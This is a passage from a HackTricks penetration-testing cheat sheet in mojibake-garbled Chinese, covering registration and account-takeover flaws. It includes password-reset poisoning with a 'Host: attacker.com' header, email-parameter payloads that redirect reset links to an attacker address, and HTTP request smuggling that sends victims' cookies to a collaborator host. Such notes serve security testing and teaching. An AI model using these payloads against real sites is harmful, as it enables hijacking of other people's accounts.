# æ³¨å†Œä¸æ¥ç®¡æ¼æ´

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


## æ³¨å†Œæ¥ç®¡

### é‡å¤æ³¨å†Œ

* å°è¯•ä½¿ç”¨ç°æœ‰ç”¨æˆ·åç”Ÿæˆ
* æ£€æŸ¥ä¸åŒçš„ç”µå­é‚®ä»¶ï¼š
* å¤§å†™å­—æ¯
* \+1@
* åœ¨ç”µå­é‚®ä»¶ä¸­æ·»åŠ ä¸€äº›ç‚¹
* ç”µå­é‚®ä»¶åç§°ä¸­çš„ç‰¹æ®Šå­—ç¬¦ (%00, %09, %20)
* åœ¨ç”µå­é‚®ä»¶åæ”¾ç½®é»‘è‰²å­—ç¬¦ï¼š`test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### ç”¨æˆ·åæšä¸¾

æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ç¡®å®šç”¨æˆ·åæ˜¯å¦å·²åœ¨åº”ç”¨ç¨‹åºä¸­æ³¨å†Œã€‚

### å¯†ç ç­–ç•¥

åˆ›å»ºç”¨æˆ·æ—¶æ£€æŸ¥å¯†ç ç­–ç•¥ï¼ˆæ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ä½¿ç”¨å¼±å¯†ç ï¼‰ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£å‡­æ®ã€‚

### SQL æ³¨å…¥

[**æŸ¥çœ‹æ­¤é¡µé¢**](sql-injection/#insert-statement)ä»¥äº†è§£å¦‚ä½•é€šè¿‡æ³¨å†Œè¡¨å•ä¸­çš„ **SQL æ³¨å…¥** å°è¯•è´¦æˆ·æ¥ç®¡æˆ–æå–ä¿¡æ¯ã€‚

### Oauth æ¥ç®¡

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML æ¼æ´

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### æ›´æ”¹ç”µå­é‚®ä»¶

æ³¨å†Œåå°è¯•æ›´æ”¹ç”µå­é‚®ä»¶ï¼Œå¹¶æ£€æŸ¥æ­¤æ›´æ”¹æ˜¯å¦å¾—åˆ°æ­£ç¡®éªŒè¯ï¼Œæˆ–æ˜¯å¦å¯ä»¥æ›´æ”¹ä¸ºä»»æ„ç”µå­é‚®ä»¶ã€‚

### æ›´å¤šæ£€æŸ¥

* æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ä½¿ç”¨ **ä¸€æ¬¡æ€§ç”µå­é‚®ä»¶**
* **é•¿** **å¯†ç ** (>200) å¯¼è‡´ **DoS**
* **æ£€æŸ¥è´¦æˆ·åˆ›å»ºçš„é€Ÿç‡é™åˆ¶**
* ä½¿ç”¨ username@**burp\_collab**.net å¹¶åˆ†æ **å›è°ƒ**

## **å¯†ç é‡ç½®æ¥ç®¡**

### é€šè¿‡å¼•èäººæ³„éœ²å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. è¯·æ±‚å°†å¯†ç é‡ç½®åˆ°æ‚¨çš„ç”µå­é‚®ä»¶åœ°å€
2. ç‚¹å‡»å¯†ç é‡ç½®é“¾æ¥
3. ä¸è¦æ›´æ”¹å¯†ç 
4. ç‚¹å‡»ä»»ä½•ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ˆä¾‹å¦‚ï¼šFacebookï¼ŒTwitterï¼‰
5. åœ¨ Burp Suite ä»£ç†ä¸­æ‹¦æˆªè¯·æ±‚
6. æ£€æŸ¥ referer å¤´æ˜¯å¦æ³„éœ²å¯†ç é‡ç½®ä»¤ç‰Œã€‚

### å¯†ç é‡ç½®ä¸­æ¯’ <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. åœ¨ Burp Suite ä¸­æ‹¦æˆªå¯†ç é‡ç½®è¯·æ±‚
2. åœ¨ Burp Suite ä¸­æ·»åŠ æˆ–ç¼–è¾‘ä»¥ä¸‹å¤´éƒ¨ï¼š`Host: attacker.com`ï¼Œ`X-Forwarded-Host: attacker.com`
3. è½¬å‘å¸¦æœ‰ä¿®æ”¹å¤´éƒ¨çš„è¯·æ±‚\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. æŸ¥æ‰¾åŸºäº _host å¤´_ çš„å¯†ç é‡ç½® URLï¼Œä¾‹å¦‚ï¼š`https://attacker.com/reset-password.php?token=TOKEN`

### é€šè¿‡ç”µå­é‚®ä»¶å‚æ•°é‡ç½®å¯†ç  <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. æ”»å‡»è€…å¿…é¡»ä½¿ç”¨ä»–ä»¬çš„è´¦æˆ·ç™»å½•å¹¶è¿›å…¥**æ›´æ”¹å¯†ç **åŠŸèƒ½ã€‚
2. å¯åŠ¨Burp Suiteå¹¶æ‹¦æˆªè¯·æ±‚
3. å°†å…¶å‘é€åˆ°é‡å‘å™¨é€‰é¡¹å¡å¹¶ç¼–è¾‘å‚æ•°ï¼šç”¨æˆ·ID/ç”µå­é‚®ä»¶\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

å¯†ç é‡ç½®ä»¤ç‰Œåº”è¯¥æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½æ˜¯å”¯ä¸€çš„ã€‚\
å°è¯•ç¡®å®šä»¤ç‰Œæ˜¯å¦è¿‡æœŸæˆ–æ˜¯å¦æ€»æ˜¯ç›¸åŒï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”Ÿæˆç®—æ³•è¾ƒå¼±ï¼Œå¯ä»¥è¢«çŒœæµ‹ã€‚ä»¥ä¸‹å˜é‡å¯èƒ½è¢«ç®—æ³•ä½¿ç”¨ã€‚

* æ—¶é—´æˆ³
* ç”¨æˆ·ID
* ç”¨æˆ·çš„ç”µå­é‚®ä»¶
* åå­—å’Œå§“æ°
* å‡ºç”Ÿæ—¥æœŸ
* åŠ å¯†
* ä»…æ•°å­—
* å°ä»¤ç‰Œåºåˆ—ï¼ˆå­—ç¬¦åœ¨\[A-Z,a-z,0-9]ä¹‹é—´ï¼‰
* ä»¤ç‰Œé‡ç”¨
* ä»¤ç‰Œè¿‡æœŸæ—¥æœŸ

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. ä½¿ç”¨API/UIè§¦å‘ç‰¹å®šç”µå­é‚®ä»¶çš„å¯†ç é‡ç½®è¯·æ±‚ï¼Œä¾‹å¦‚ï¼štest@mail.com
2. æ£€æŸ¥æœåŠ¡å™¨å“åº”å¹¶æŸ¥çœ‹`resetToken`
3. ç„¶ååœ¨URLä¸­ä½¿ç”¨ä»¤ç‰Œï¼Œå¦‚`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. ä½¿ç”¨ä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„ç”¨æˆ·ååœ¨ç³»ç»Ÿä¸­æ³¨å†Œï¼Œä½†åœ¨ç”¨æˆ·åå‰åæ’å…¥ç©ºæ ¼ã€‚ä¾‹å¦‚ï¼š`"admin "`
2. ä½¿ç”¨æ‚¨çš„æ¶æ„ç”¨æˆ·åè¯·æ±‚å¯†ç é‡ç½®ã€‚
3. ä½¿ç”¨å‘é€åˆ°æ‚¨ç”µå­é‚®ä»¶çš„ä»¤ç‰Œé‡ç½®å—å®³è€…å¯†ç ã€‚
4. ä½¿ç”¨æ–°å¯†ç è¿æ¥åˆ°å—å®³è€…è´¦æˆ·ã€‚

å¹³å°CTFdå¯¹è¯¥æ”»å‡»å­˜åœ¨æ¼æ´ã€‚\
è§ï¼š[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. åœ¨åº”ç”¨ç¨‹åºæˆ–å­åŸŸä¸­æ‰¾åˆ°XSSï¼Œå¦‚æœcookiesçš„ä½œç”¨åŸŸä¸ºçˆ¶åŸŸï¼š`*.domain.com`
2. æ³„éœ²å½“å‰**ä¼šè¯cookie**
3. ä½¿ç”¨cookieä½œä¸ºç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. ä½¿ç”¨**smuggler**æ£€æµ‹HTTPè¯·æ±‚èµ°ç§çš„ç±»å‹ï¼ˆCL, TE, CL.TEï¼‰\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. æ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†ç”¨ä»¥ä¸‹æ•°æ®è¦†ç›–`POST / HTTP/1.1`ï¼š\
`GET http://something.burpcollaborator.net HTTP/1.1 X:`ï¼Œç›®çš„æ˜¯å°†å—å®³è€…é‡å®šå‘åˆ°burpcollabå¹¶çªƒå–ä»–ä»¬çš„cookies\
3\. æœ€ç»ˆè¯·æ±‚å¯èƒ½çœ‹èµ·æ¥åƒä»¥ä¸‹å†…å®¹
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone æŠ¥å‘Šåˆ©ç”¨æ­¤æ¼æ´\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### é€šè¿‡ CSRF å®ç°è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. åˆ›å»º CSRF çš„æœ‰æ•ˆè½½è·ï¼Œä¾‹å¦‚ï¼šâ€œç”¨äºå¯†ç æ›´æ”¹çš„è‡ªåŠ¨æäº¤ HTML è¡¨å•â€
2. å‘é€æœ‰æ•ˆè½½è·

### é€šè¿‡ JWT å®ç°è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token å¯èƒ½ç”¨äºéªŒè¯ç”¨æˆ·ã€‚

* ä½¿ç”¨å¦ä¸€ä¸ªç”¨æˆ· ID / ç”µå­é‚®ä»¶ç¼–è¾‘ JWT
* æ£€æŸ¥å¼± JWT ç­¾å

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## å‚è€ƒ

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
